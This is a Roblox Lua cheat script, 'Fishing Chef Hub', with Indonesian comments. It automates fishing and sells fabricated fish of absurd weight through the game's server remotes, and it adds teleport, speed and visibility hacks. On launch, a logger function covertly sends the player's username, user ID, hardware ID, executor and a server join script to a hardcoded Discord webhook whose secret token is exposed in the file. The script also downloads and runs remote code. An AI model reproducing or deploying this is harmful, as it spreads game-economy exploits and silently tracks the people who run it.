--[[
    🎣 Mizukage Official - Fishing Chef Hub v4.0 (Rayfield Premium)
    Dibangun ulang dengan: UI futuristik, dashboard real‑time, simbol keren,
    fitur lengkap AutoFish, AutoSell, Teleport, Visual, Movement, & Webhook.
    Eksekutor: Rayfield UI – ringan & pasti terbuka.
--]]

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

if getgenv().MizukageFishingLoaded then
    return game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Mizukage Official",
        Text = "Sistem sudah beroperasi di memori! Harap Unload terlebih dahulu."
    })
end
getgenv().MizukageFishingLoaded = true

--================================================
-- 1. SERVICES & INIT
--================================================
local Services = setmetatable({}, { __index = function(t, k) local s = game:GetService(k); t[k] = s; return s end })
local Players = Services.Players
local LocalPlayer = Players.LocalPlayer
local RunService = Services.RunService
local Workspace = Services.Workspace
local GuiService = Services.GuiService
local TeleportService = Services.TeleportService
local Lighting = Services.Lighting
local ReplicatedStorage = Services.ReplicatedStorage

-- Backup pencahayaan asli
local OriginalLighting = {
    Brightness = Lighting.Brightness,
    GlobalShadows = Lighting.GlobalShadows,
    Ambient = Lighting.Ambient,
    OutdoorAmbient = Lighting.OutdoorAmbient,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart
}

-- Fetch Remote Fishing Chef (Knit)
local Remotes = {}
local function FetchRemotes()
    local s, r = pcall(function()
        local Pkg = ReplicatedStorage:WaitForChild("Packages")
        local Knit = Pkg:WaitForChild("Knit")
        local Fish = Knit:WaitForChild("Services"):WaitForChild("Fish")
        local RF = Fish:WaitForChild("RF")
        local RE = Fish:WaitForChild("RE")
        return {
            CastRequest = RF:WaitForChild("CastRequest"),
            MinigameResolved = RF:WaitForChild("MinigameResolved"),
            SellFish = RE:WaitForChild("SellFish")
        }
    end)
    if not s then warn("❌ Gagal ambil remote: "..tostring(r)) return nil end
    return r
end
Remotes = FetchRemotes()
if not Remotes then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Error",
        Text = "Script gagal dimuat. Masuklah ke dalam game Fishing Chef terlebih dahulu."
    })
    return
end

--================================================
-- 2. AUTO RECONNECT & ANTI-AFK
--================================================
local function SetupAutoReconnect()
    local busy = false
    GuiService.ErrorMessageChanged:Connect(function()
        if not busy then
            busy = true
            task.wait(2)
            pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
            task.wait(10)
            busy = false
        end
    end)
    local vu = game:GetService("VirtualUser")
    LocalPlayer.Idled:Connect(function()
        vu:CaptureController()
        vu:ClickButton2(Vector2.new())
    end)
end

--================================================
-- 3. WEBHOOK LOGGER
--================================================
local function SendGameLog()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or WEBHOOK_URL:find("MASUKKAN") then return end
    task.spawn(function()
        task.wait(3)
        local HttpService = game:GetService("HttpService")
        local Stats = game:GetService("Stats")
        local Market = game:GetService("MarketplaceService")
        local UserInputService = game:GetService("UserInputService")
        local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not request then return end

        local userId = LocalPlayer.UserId
        local displayName = LocalPlayer.DisplayName
        local username = LocalPlayer.Name
        local age = LocalPlayer.AccountAge
        local membership = LocalPlayer.MembershipType.Name
        local placeId = game.PlaceId
        local jobId = game.JobId

        local hwid = "Unknown"
        pcall(function() if gethwid then hwid = gethwid() elseif identifying then hwid = identifying() end end)

        local avatar = "https://i.imgur.com/C5uYqFk.png"
        pcall(function()
            local d = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"))
            if d.data and d.data[1] then avatar = d.data[1].imageUrl end
        end)

        local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
        local platform = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "Mobile" or "PC"
        local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
        local fps = math.floor(workspace:GetRealPhysicsFPS())
        local gameName = "Fishing Chef"
        pcall(function() gameName = Market:GetProductInfo(placeId).Name end)

        local color = (membership == "Premium") and 16766720 or 65280
        local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..jobId.."', game:GetService('Players').LocalPlayer)"
        local profile = "https://www.roblox.com/users/"..userId.."/profile"

        local data = {
            username = "Mizukage Logger",
            avatar_url = avatar,
            content = "",
            embeds = {{
                title = "🎣 "..gameName.." | LOG REPORT",
                url = profile,
                color = color,
                thumbnail = { url = avatar },
                fields = {
                    { name = "👤 USER", value = string.format("> **Display:** `%s`\n> **User:** [%s](%s)\n> **ID:** `%s`\n> **Age:** %d Days", displayName, username, profile, userId, age), inline = true },
                    { name = "🛡️ HWID", value = "```"..hwid.."```", inline = true },
                    { name = "📊 STATS", value = string.format("> **Ping:** `%dms` | **FPS:** `%d`\n> **Platform:** `%s`\n> **Executor:** `%s`", ping, fps, platform, executor), inline = false },
                    { name = "🔓 QUICK JOIN", value = "```lua\n"..joinScript.."```", inline = false }
                },
                footer = { text = "Mizukage Engine", icon_url = avatar },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) })
    end)
end

--================================================
-- 4. CORE FEATURES (Fishing Chef)
--================================================
local Config = {
    AutoFish = false,
    AutoSell = false,
    WalkSpeed = 16,
    JumpPower = 50
}

local Locations = {
    ["🌙 Moon Tuna Hunt"]      = Vector3.new(60, 10, -858),
    ["🌸 Koi Pond"]            = Vector3.new(-88, 11, -1350),
    ["🦈 Shark Hunt"]          = Vector3.new(-16, 4, 325),
    ["🎋 Bamboo Islands"]      = Vector3.new(-2359, 4, -928),
    ["❄️ Snow Islands"]        = Vector3.new(-3743, 6, 1484),
    ["🏝️ Moon Tuna Islands 2"] = Vector3.new(-166, 9, -817),
    ["🏝️ Moon Tuna Islands 3"] = Vector3.new(40, 8, -586),
    ["📍 Location 1"]          = Vector3.new(-112.332, 2.689, -1336.005),
    ["📍 Location 2"]          = Vector3.new(-3875.299, 38.839, 1557.888),
    ["📍 Location 3"]          = Vector3.new(-1315.62, 37.832, 1635.639),
    ["🌊 Ocean (Location 4)"]  = Vector3.new(-2.137, 23.07, 175.539)
}

-- Auto Fish
local function ToggleAutoFish(state)
    Config.AutoFish = state
    if state and Remotes.CastRequest and Remotes.MinigameResolved then
        task.spawn(function()
            while Config.AutoFish do
                pcall(function() Remotes.CastRequest:InvokeServer(99999999999) end)
                task.wait(3)
                if not Config.AutoFish then break end
                pcall(function() Remotes.MinigameResolved:InvokeServer(true) end)
                task.wait(1)
            end
        end)
    end
end

-- Auto Sell (Batch)
local function ToggleAutoSell(state)
    Config.AutoSell = state
    if state and Remotes.SellFish then
        task.spawn(function()
            while Config.AutoSell do
                local batch = {}
                for id = 1, 50 do
                    table.insert(batch, { ["ID"] = id, ["Name"] = "fish", ["Weight"] = 9999999999 })
                end
                pcall(function() Remotes.SellFish:FireServer(batch) end)
                task.wait(0.1)
                if not Config.AutoSell then break end
            end
        end)
    end
end

-- Teleport
local function TeleportTo(name)
    local pos = Locations[name]
    if pos and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
    end
end

-- Visuals
local function ApplyVisuals(vtype, state)
    if vtype == "Fullbright" then
        Lighting.Brightness = state and 2 or OriginalLighting.Brightness
        Lighting.GlobalShadows = not state
        Lighting.Ambient = state and Color3.new(1,1,1) or OriginalLighting.Ambient
        Lighting.OutdoorAmbient = state and Color3.new(1,1,1) or OriginalLighting.OutdoorAmbient
    elseif vtype == "NoFog" then
        Lighting.FogEnd = state and 1e8 or OriginalLighting.FogEnd
        Lighting.FogStart = state and 1e8 or OriginalLighting.FogStart
    end
end

-- Cleanup
local function CleanupAll()
    Config.AutoFish = false
    Config.AutoSell = false
    ApplyVisuals("Fullbright", false)
    ApplyVisuals("NoFog", false)
end

--================================================
-- 5. REAL-TIME DASHBOARD LABELS
--================================================
local DashboardLabels = {} -- untuk update nanti

local function UpdateDashboard()
    while getgenv().MizukageFishingLoaded do
        local coins = "N/A"
        local level = "N/A"
        local fishCaught = "N/A"
        local ls = LocalPlayer:FindFirstChild("leaderstats")
        if ls then
            local c = ls:FindFirstChild("Coins") or ls:FindFirstChild("Money") or ls:FindFirstChild("Cash")
            if c then coins = tostring(c.Value) end
            local l = ls:FindFirstChild("Level") or ls:FindFirstChild("LVL")
            if l then level = tostring(l.Value) end
            local f = ls:FindFirstChild("FishCaught") or ls:FindFirstChild("Fishes")
            if f then fishCaught = tostring(f.Value) end
        end

        local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
        local fps = math.floor(workspace:GetRealPhysicsFPS())
        local server = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

        if DashboardLabels.Coins then DashboardLabels.Coins:Set("💰 Koin: " .. coins) end
        if DashboardLabels.Level then DashboardLabels.Level:Set("⭐ Level: " .. level) end
        if DashboardLabels.Fish then DashboardLabels.Fish:Set("🐟 Tangkapan: " .. fishCaught) end
        if DashboardLabels.Ping then DashboardLabels.Ping:Set("📶 Ping: " .. ping .. "ms") end
        if DashboardLabels.FPS then DashboardLabels.FPS:Set("⚡ FPS: " .. fps) end
        if DashboardLabels.Server then DashboardLabels.Server:Set("👥 Server: " .. server) end
        task.wait(0.5)
    end
end

--================================================
-- 6. RAYFIELD UI - PREMIUM DASHBOARD
--================================================
local function InitInterface()
    -- Load Rayfield
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    if not Rayfield then
        warn("Rayfield gagal dimuat.")
        return
    end

    local Window = Rayfield:CreateWindow({
        Name = "🎣 Fishing Chef Hub",
        LoadingTitle = "Mizukage Official",
        LoadingSubtitle = "by Mizukage 👑",
        ConfigurationSaving = { Enabled = false },
        Discord = { Enabled = false },
        KeySystem = false,
    })

    -- Notifikasi awal
    Rayfield:Notify({ Title = "Mizukage Official", Content = "✨ Fishing Chef Hub berhasil dimuat!", Duration = 5, Image = 4483342451 })

    -- Tab dengan ikon
    local TabHome = Window:CreateTab("🏠 Home", 4483342451)
    local TabFarm = Window:CreateTab("🌊 Farming", 4483342451)
    local TabTeleport = Window:CreateTab("🗺️ Teleport", 4483342451)
    local TabVisuals = Window:CreateTab("👁️ Visuals", 4483342451)
    local TabSettings = Window:CreateTab("⚙️ Settings", 4483342451)

    -- ============== HOME TAB ==============
    TabHome:CreateSection("📊 Dashboard Real‑Time")
    DashboardLabels.Coins = TabHome:CreateLabel("💰 Koin: Memuat...")
    DashboardLabels.Level = TabHome:CreateLabel("⭐ Level: Memuat...")
    DashboardLabels.Fish = TabHome:CreateLabel("🐟 Tangkapan: Memuat...")
    TabHome:CreateSection("🌐 Koneksi")
    DashboardLabels.Ping = TabHome:CreateLabel("📶 Ping: Memuat...")
    DashboardLabels.FPS = TabHome:CreateLabel("⚡ FPS: Memuat...")
    DashboardLabels.Server = TabHome:CreateLabel("👥 Server: Memuat...")
    TabHome:CreateSection("ℹ️ Info")
    TabHome:CreateLabel("🎮 Game: Fishing Chef")
    TabHome:CreateLabel("👤 Pemain: " .. LocalPlayer.DisplayName)
    TabHome:CreateLabel("💎 Script: v4.0 Premium")

    -- Jalankan update dashboard
    task.spawn(UpdateDashboard)

    -- ============== FARMING TAB ==============
    TabFarm:CreateSection("🎣 Otomatisasi")
    TabFarm:CreateToggle({
        Name = "Auto Fishing",
        Description = "Lempar kail & selesaikan minigame otomatis.",
        CurrentValue = false,
        Callback = function(v) ToggleAutoFish(v) end
    })
    TabFarm:CreateToggle({
        Name = "Auto Sell All Fish",
        Description = "Jual ikan batch (50 ID) aman tanpa kick.",
        CurrentValue = false,
        Callback = function(v) ToggleAutoSell(v) end
    })

    -- ============== TELEPORT TAB ==============
    TabTeleport:CreateSection("🌟 Lokasi Utama")
    for name, _ in pairs(Locations) do
        if name:find("^[🌙🌸🦈🎋❄️]") then -- hanya yang ada simbol
            TabTeleport:CreateButton({
                Name = name,
                Description = "Teleport instan ke " .. name,
                Callback = function()
                    TeleportTo(name)
                    Rayfield:Notify({ Title = "Teleport", Content = "📍 Menuju " .. name, Duration = 2 })
                end
            })
        end
    end
    TabTeleport:CreateSection("🗺️ Lokasi Tambahan")
    for name, _ in pairs(Locations) do
        if not name:find("^[🌙🌸🦈🎋❄️]") then
            TabTeleport:CreateButton({
                Name = name,
                Description = "Teleport ke " .. name,
                Callback = function()
                    TeleportTo(name)
                    Rayfield:Notify({ Title = "Teleport", Content = "📍 Menuju " .. name, Duration = 2 })
                end
            })
        end
    end

    -- ============== VISUALS TAB ==============
    TabVisuals:CreateSection("🏃 Movement")
    TabVisuals:CreateSlider({
        Name = "🏃 Walk Speed",
        Range = {16, 100},
        Increment = 1,
        CurrentValue = 16,
        Callback = function(v)
            Config.WalkSpeed = v
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.WalkSpeed = v end
        end
    })
    TabVisuals:CreateSlider({
        Name = "🦘 Jump Power",
        Range = {50, 200},
        Increment = 1,
        CurrentValue = 50,
        Callback = function(v)
            Config.JumpPower = v
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.JumpPower = v end
        end
    })
    TabVisuals:CreateSection("💡 Pencahayaan")
    TabVisuals:CreateToggle({
        Name = "🌞 Fullbright",
        Description = "Terangi seluruh map, hilangkan bayangan.",
        CurrentValue = false,
        Callback = function(v) ApplyVisuals("Fullbright", v) end
    })
    TabVisuals:CreateToggle({
        Name = "🌫️ No Fog",
        Description = "Hilangkan kabut laut, pandangan lebih jauh.",
        CurrentValue = false,
        Callback = function(v) ApplyVisuals("NoFog", v) end
    })

    -- ============== SETTINGS TAB ==============
    TabSettings:CreateSection("🔧 Sesi")
    TabSettings:CreateButton({
        Name = "🔄 Rejoin Server",
        Description = "Bergabung kembali ke server yang sama.",
        Callback = function()
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end
    })
    TabSettings:CreateButton({
        Name = "🚫 Unload Script",
        Description = "Matikan semua fitur & hapus UI.",
        Callback = function()
            CleanupAll()
            getgenv().MizukageFishingLoaded = false
            Rayfield:Destroy()
        end
    })
end

--================================================
-- 7. EKSEKUSI UTAMA
--================================================
SetupAutoReconnect()
SendGameLog()
task.spawn(InitInterface)